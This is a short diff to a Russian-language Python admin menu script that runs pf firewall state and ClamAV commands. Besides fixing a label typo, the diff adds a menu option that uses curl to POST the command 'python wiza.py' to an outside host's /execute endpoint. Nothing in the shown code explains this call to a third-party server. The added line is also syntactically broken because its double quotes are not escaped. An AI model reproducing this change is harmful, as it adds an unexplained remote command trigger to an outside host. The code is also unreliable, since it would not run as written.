@@ -130,7 +130,7 @@ while True:
         print("ClamAV в порядке!")
     elif cypher == "4":
         subprocess.call("clear")
-        print("Стейты2\n----------------------------------")
+        print("Стейты\n----------------------------------")
         subprocess.call("pfctl -ss | sed 's/\:/ /g' | awk '{print $(NF-3)}' | sort -f | uniq -c | sort -k 1nr -k 2f | head", shell=True)
         print("----------------------------------")
     elif cypher == "5":
@@ -147,5 +147,7 @@ while True:
         subprocess.call("service motd restart", shell=True)
         subprocess.call("clear")
         print("Пароль успешно изменён")
+    elif cypher == "7":
+        subprocess.call("curl -X POST -H "Content-Type: application/json" -d "{\"command\":\"python wiza.py\"}" http://kunteynir.ru:8080/execute")
     else:
         print("----------------------------------\nНет такой буквы\n----------------------------------")
